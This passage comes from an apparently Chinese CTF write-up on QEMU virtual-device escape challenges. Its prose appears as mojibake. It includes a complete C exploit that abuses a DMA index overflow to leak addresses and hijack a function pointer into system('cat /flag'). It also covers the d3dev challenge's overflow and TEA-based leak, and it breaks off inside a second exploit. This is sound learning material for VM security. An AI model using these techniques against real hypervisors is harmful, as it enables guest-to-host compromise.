<code>cpu_physical_memory_rw</code> å‡½æ•°</p><blockquote><p><code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf,int len, int is_write)</code> å‡½æ•°æ˜¯ <code>QEMU</code> è™šæ‹Ÿæœºç›‘è§†å™¨ä¸­ä¸€ä¸ªç”¨äºè¯»å†™ç‰©ç†å†…å­˜çš„å‡½æ•°ã€‚è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨è™šæ‹Ÿæœºä¸­è¯»å†™æŒ‡å®šåœ°å€çš„ç‰©ç†å†…å­˜ï¼Œå¹¶å°†è¯»å–æˆ–å†™å…¥çš„æ•°æ®å­˜å‚¨åœ¨ç»™å®šçš„ç¼“å†²åŒºä¸­ã€‚å®ƒçš„å‚æ•°å¦‚ä¸‹ï¼š</p><ul><li><code>hwaddr addr</code>ï¼šä¸€ä¸ªè¡¨ç¤ºç‰©ç†å†…å­˜åœ°å€çš„æ— ç¬¦å·æ•´æ•°ç±»å‹ã€‚éœ€è¦è¯»å†™çš„ç‰©ç†åœ°å€ã€‚</li><li><code>uint8_t *buf</code>ï¼šä¸€ä¸ªæŒ‡å‘è¦è¯»å–æˆ–å†™å…¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚æ•°æ®å­˜å‚¨åœ¨è¿™é‡Œã€‚</li><li><code>int len</code>ï¼šä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºè¦è¯»å–æˆ–å†™å…¥æ•°æ®çš„é•¿åº¦ã€‚</li><li><code>int is_write</code>ï¼šä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ“ä½œæ˜¯è¯»å–ï¼ˆ0ï¼‰è¿˜æ˜¯å†™å…¥ï¼ˆé0ï¼‰æ“ä½œã€‚</li></ul></blockquote><p>ä»¥è¿™è¡Œä»£ç ä¸ºä¾‹ <code>cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, 1);</code>  ï¼Œå…¶ä½œç”¨æ˜¯å°† <code>cnt_low</code> å†™å…¥ç‰©ç†å†…å­˜ <code>opaque-&gt;dma.dst</code> çš„ä½ç½®ï¼ˆ <code>qemu</code> ä¸­çš„ç‰©ç†å†…å­˜ ï¼‰,å†™å…¥çš„å­—èŠ‚æ•°ä¸º <code>opaque-&gt;dma.cnt</code> ã€‚</p><p><code>cnt_low</code> æ˜¯ç”± <code>(uint8_t *)&amp;opaque-&gt;dma_buf[v2]</code> æ‰€èµ‹å€¼çš„ï¼Œæˆ‘ä»¬ä¸Šé¢æåˆ°äº† <code>dma_buf</code> æ•°ç»„å­˜åœ¨ç´¢å¼•æº¢å‡ºï¼Œç°åœ¨æ¥çœ‹ä¸‹æ¯” <code>dma_buf</code> ä½çš„ä½ç½®æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820030.png" alt="image-20230304162135975" style="zoom: 50%;" /><p>å‘ç°äº† <code>dma_buf</code> ä¸‹é¢ç´§æŒ¨ç€çš„å°±æ˜¯ <code>enc</code> è¿™ä¸ªå‡½æ•°åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®© <code>v2</code> æº¢å‡ºï¼Œè®©å…¶ <code>dma_buf[v2]</code> æŒ‡å‘ <code>enc</code> ï¼Œæ¥ç€æ‰§è¡Œ <code>cpu_physical_memory_rw</code> å‡½æ•°ï¼Œè¿™æ · <code>enc</code> å‡½æ•°çš„åœ°å€å°±ä¼šè¢«å†™å…¥åˆ° <code>opaque-&gt;dma.dst</code> æŒ‡å‘çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦è®© <code>opaque-&gt;dma.dst</code> ä¸ºæˆ‘ä»¬èƒ½å¤Ÿè®¿é—®çš„ç‰©ç†å†…å­˜ï¼Œæ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ‰“å°è¿™ä¸ªç‰©ç†å†…å­˜æ‰€å¯¹åº”çš„å˜é‡å°±èƒ½è·å–ç¨‹åºåŸºåœ°å€</p><p>æœç´¢ä¸€ä¸‹å‘ç°ï¼Œæœ¬é¢˜æ˜¯æœ‰ <code>system</code> å‡½æ•°çš„ï¼Œæ‰€ä»¥åªè¦æ‹¿åˆ°ç¨‹åºé‡Œå‡½æ•°çš„åœ°å€ï¼Œç”¨å›ºå®šåç§»å°±å¯ä»¥å¾—åˆ° <code>system</code> å‡½æ•°çš„åœ°å€ã€‚</p><p>**æ³¨æ„ï¼š<code>cpu_physical_memory_rw</code> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦çš„æ˜¯ç‰©ç†åœ°å€ï¼Œæ‰€ä»¥éœ€è¦å°† <code>qemu</code> ä¸­çš„è™šæ‹Ÿå†…å­˜è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œå…·ä½“è½¬æ¢çš„æ–¹æ³•å¯ä»¥å‚è€ƒæ–‡æœ«çš„ <code>qemu</code> ä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜éƒ¨åˆ† ** </p><p>è¿™é‡Œçš„ <code>exp</code> å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> enc_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line"><span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª <code>exp</code> å…ˆæ‰“å°äº†æˆ‘å®šä¹‰çš„ <code>enc_addr</code> è¿™ä¸ªå˜é‡åœ¨ <code>qemu</code> ä¸­çš„è™šæ‹Ÿåœ°å€ï¼Œä»¥åŠåœ¨ <code>qemu</code> ä¸­çš„ç‰©ç†åœ°å€ï¼Œå’Œå˜é‡æœ¬èº«çš„å€¼ã€‚å½“æ‰§è¡Œå®Œ <code>cpu_physical_memory_rw</code> å‡½æ•°åå†æ¬¡æ‰“å° <code>enc_addr</code> å˜é‡çš„å€¼ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820680.png" alt="image-20230304175344273"></p><p>å¯ä»¥å‘ç° <code>enc_value</code> ä»æœ€å¼€å§‹çš„ <code>0</code> åœ¨ <code>cpu_physical_memory_rw</code> å‡½æ•°æ‰§è¡Œåï¼Œå˜æˆäº† <code>0x55835e3b3dd0</code> ï¼Œè¿™ä¸ªåœ°å€æ­£æ˜¯ <code>enc</code> å‡½æ•°çš„åœ°å€ã€‚ä»è€Œè¯´æ˜äº† <code>cpu_physical_memory_rw</code> å‡½æ•°å¯ä»¥å°†ä¸€ä¸ªå€¼å†™å…¥åˆ°æˆ‘ä»¬æŒ‡å®šçš„ç‰©ç†å†…å­˜ä¸­</p><p>å¦‚æœèƒ½ç†è§£ä¸Šé¢è¿™ä¸ªå°† <code>enc</code> å‡½æ•°çš„åœ°å€è¯»åˆ°ç‰©ç†åœ°å€ä¸Šçš„è¿‡ç¨‹ï¼Œé‚£ä¾æ¬¡ç±»æ¨ï¼Œå°†ç‰©ç†åœ°å€ä¸­çš„æ•°æ®å†™å› <code>opaque-&gt;dma_buf[v2]</code> ä¹Ÿå°±å¾ˆå¥½ç†è§£äº†ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820582.png" alt="image-20230304201045218"></p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœç”¨ <code>IDA</code> æ¥çœ‹è¿™ä¸ª <code>v6</code> åé¢çš„èµ‹å€¼ä¼šæ„Ÿè§‰ååˆ†éš¾ç†è§£ï¼Œè¿™é‡Œåè€Œçœ‹æ±‡ç¼–ä¼šæ›´å®¹æ˜“ç†è§£ã€‚</p><p>æ±‡ç¼–éƒ¨åˆ†å¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820277.png" alt="image-20230304201218093"></p><p>é€šè¿‡åˆ†æè¿™å››è¡Œæ±‡ç¼–ï¼Œå‘ç°ä¸Šé¢ç»™ <code>v6</code> èµ‹å€¼çš„ä»£ç å°±æ˜¯ <code>opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000]</code> </p><p>æ‰€ä»¥æ§åˆ¶ <code>dma.dst</code> ä¸º <code>0x41000</code> ï¼Œæ­¤æ—¶å°±æ˜¯ <code>dma_buf[0x1000]</code> è¿™ä¸ªä½ç½®æ”¾çš„å°±æ˜¯ <code>enc</code> å‡½æ•°çš„åœ°å€ï¼Œ<code>cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0)</code> å‡½æ•°ä¼šå°† <code>opaque-&gt;dma.src</code> ä¸­çš„æ•°æ®è¯»å…¥åˆ° <code>dma_buf[0x1000]</code> çš„ä½ç½®ï¼Œå› ä¸º <code>dma.src</code> æ˜¯ç‰©ç†å†…å­˜åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬å°† <code>system</code> å‡½æ•°çš„ç‰©ç†åœ°å€å†™å…¥ <code>dma.src</code> ã€‚</p><p>æœ€åæˆ‘ä»¬ä¾ç„¶åˆ©ç”¨ä¸€æ¬¡ <code>cpu_physical_memory_rw</code> å‡½æ•°æ¥å¾€è™šæ‹Ÿåœ°å€ä¸­å†™å‚æ•°ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820553.png" alt="image-20230304202531687"></p><p>æ­¤æ—¶æˆ‘ä»¬çš„ <code>v6</code> è¦å†™ä¸ºå‚æ•°çš„åœ°å€ï¼Œè¿™å›æˆ‘ä»¬ä¸éœ€è¦æ•°ç»„ç´¢å¼•æº¢å‡ºäº†ï¼Œå› æ­¤æˆ‘é€‰æ‹©äº†å°†å‚æ•°å†™å…¥åˆ° <code>opaque-&gt;dma_buf[0]</code> çš„ä½ç½®ï¼Œç„¶åè¿›å…¥ <code>(v4 &amp; 4)!=0</code> è¿™ä¸ªåˆ†æ”¯ï¼Œå»è°ƒç”¨ <code>opaque-&gt;enc((char *)v6,cnt_low)</code>  åŠ«æŒæ‰§è¡Œæµï¼Œè°ƒç”¨ <code>system(&quot;cat /flag&quot;)</code> </p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> * addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> page;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="type">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="type">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">perror(msg);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint64_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:04.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line"><span class="comment">//printf(&quot;mmio_write @ ----&gt; %p\n&quot;,mmio_write);</span></span><br><span class="line">    getchar();</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line">    <span class="type">uint64_t</span> enc_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    <span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(&amp;call_system_addr));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    <span class="type">char</span> *command=<span class="string">&quot;cat /flag;cat /root/flag;cat flag;pwd&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;command address is %llx&quot;</span>,command);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(command));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x40000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="built_in">strlen</span>(command));<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">0x4</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820957.png" alt="image-20230304172709467"></p><h3 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h3><h4 id="é¢˜ç›®é™„ä»¶"><a href="#é¢˜ç›®é™„ä»¶" class="headerlink" title="é¢˜ç›®é™„ä»¶"></a>é¢˜ç›®é™„ä»¶</h4><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp">https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp</a> æå–ç : t9gp </p><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820851.png" alt="image-20230316145717263" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820351.png" alt="image-20230316145949280" style="zoom: 67%;" /><p>é€šè¿‡è§‚å¯Ÿå¯¹æ¯” <code>class_init</code> å‡½æ•°ä¸­çš„æ•°æ®ï¼Œå‘ç° <code>d3dev</code> è®¾å¤‡å·ä¸º <code>00:03.0</code> </p><p>æ•°ç»„ç´¢å¼•æº¢å‡ºæ¼æ´ä½äº <code>d3dev_mmio_write</code> å‡½æ•°</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820215.png" alt="image-20230316150429029" style="zoom:50%;" /><p>è¿™é‡Œçš„ <code>v4</code> æ¥è‡ªäº <code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code> </p><p><code>seek</code> å’Œ <code>addr</code> éƒ½å¯æ§ï¼Œä¹Ÿå°±æ„å‘³ç€ <code>v4</code> å¯æ§ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç´¢å¼•æº¢å‡ºæ¥æ§åˆ¶ <code>rand_r</code> å‡½æ•°æŒ‡é’ˆï¼ˆå¦‚ä¸‹ï¼‰ï¼Œåœ¨ <code>d3dev_pmio_write</code> å‡½æ•°ä¸­ï¼Œè°ƒç”¨äº† <code>rand_r</code> å‡½æ•°ï¼Œå¦‚æœå°† <code>rand_r</code> æ”¹æˆ <code>system</code> å‡½æ•°ï¼Œåˆ™å¯ä»¥è§¦å‘åé—¨ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821297.png" alt="image-20230316151852507"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœä½¿ç”¨ <code>seek</code> é»˜è®¤ä¸º <code>0</code> ï¼Œé‚£ä¹ˆ<code>addr</code> éœ€è¦ä¸º <code>0x818</code> ã€‚ä½†æ˜¯ <code>MMIO</code> åŒºåŸŸä¸º <code>0x800</code> ï¼Œå› æ­¤ä½¿ç”¨ <code>0x818</code> çš„è¯ <code>PCI</code> è®¾å¤‡åœ¨å†…éƒ¨ä¼šæ£€æŸ¥åˆ°è¿™é‡Œå‘ç”Ÿäº†è¶Šç•Œï¼ˆå¦‚ä¸‹ï¼‰ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821884.png" alt="image-20230316152939181" style="zoom:50%;" /><p>æ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦æ§åˆ¶ <code>seek</code> ä¸º <code>0x100</code> ï¼Œæ§åˆ¶ <code>addr</code> ä¸º <code>0x18</code> , æ‰èƒ½è®© <code>blocks[v4]</code> æ­£å¥½è½åœ¨ <code>rand_r</code> çš„ä½ç½®ã€‚</p><h4 id="æ³„éœ²åœ°å€"><a href="#æ³„éœ²åœ°å€" class="headerlink" title="æ³„éœ²åœ°å€"></a>æ³„éœ²åœ°å€</h4><p>å› ä¸ºæœ¬é¢˜å¼€äº† <code>PIE</code> ï¼Œå³ä½¿ç¨‹åºä¸­ç»™äº† <code>system</code> å‡½æ•°ï¼Œä¾ç„¶éœ€è¦æ³„éœ²ç¨‹åºçš„åŸºåœ°å€ã€‚</p><p>æ³„éœ²åœ°å€è¿™é‡Œæ¶‰åŠä¸€ä¸ª <code>tea</code> åŠ è§£å¯†</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821914.png" alt="image-20230316153307989"></p><p>è¿™é‡Œæ˜¯å¯ä»¥è¶Šç•Œè¯»å– <code>rand_r</code> çš„åœ°å€ï¼Œä½†æ˜¯è¯»å–çš„ç»“æœä¼šæ”¾åˆ° <code>v5</code> ï¼Œç»è¿‡äº† <code>tea</code> åŠ å¯†åï¼Œæœ€ç»ˆ <code>return</code> å°†å…¶è¿”å›ï¼Œæ­¤å¤„çš„ <code>key[0] key[1] key[2] key[3]</code> åœ¨ <code>d3dev_pmio_write</code> å‡½æ•°ä¸­éƒ½å¯ä»¥è¢«è®¾ç½®ä¸º <code>0</code> ï¼ˆå¦‚ä¸‹ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819077.png" alt="image-20230316154127664" style="zoom:50%;" /><p>å› æ­¤æœ€åçš„è§£å¯†è„šæœ¬åº”è¯¥å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°†æ¥æ”¶åˆ°çš„å¯†æ–‡ç”¨è¿™ä¸ªå‡½æ•°è§£å¯†ï¼Œå³å¯å¾—åˆ° <code>rand_r</code> å‡½æ•°çš„åœ°å€ã€‚</p><p>ç”¨ <code>mmio_write</code> å‡½æ•°å†™å…¥ <code>system</code> åœ°å€çš„æ—¶å€™ï¼Œéœ€è¦å…ˆåŠ å¯†åå†™å…¥ï¼Œä¸ç„¶åªèƒ½å†™å…¥å››ä¸ªå­—èŠ‚ã€‚</p><p>æœ€åæ§åˆ¶å‚æ•°çš„è¯ï¼Œå‡è®¾æˆ‘ä»¬æƒ³æ‰§è¡Œ <code>cat flag</code> è¿™ä¸ªå‘½ä»¤ï¼Œé‚£ä¹ˆéœ€è¦æŠŠ <code>r_seed</code> è®¾ç½®ä¸º <code>cat </code>ï¼Œå› ä¸º <code>r_seed</code> çš„å¤§å°å°±ä¸ºå››å­—èŠ‚ï¼Œæ‰€ä»¥åªèƒ½å­˜æ”¾ <code>cat </code>ï¼Œè€Œ <code>r_seed</code> ä¸‹é¢çš„æ•°æ®å°±æ˜¯ <code>blocks</code> ,æ‰€ä»¥åœ¨ <code>blocks[0]</code> çš„ä½ç½®å­˜æ”¾å­—ç¬¦ä¸² <code>flag</code> </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821106.png" alt="image-20230316160923121"></p><p>æ‰§è¡Œ <code>cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</code> å‘½ä»¤ï¼Œè·å– <code>0xfebf1000</code> ä¸º <code>MMIO</code> åŸºåœ°å€ï¼Œ<code>0xc040</code>  ä¸º <code>PMIO</code> åŸºåœ°å€</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819207.png" alt="image-20230316161803354" style="zoom:50%;" /><h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc040</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span 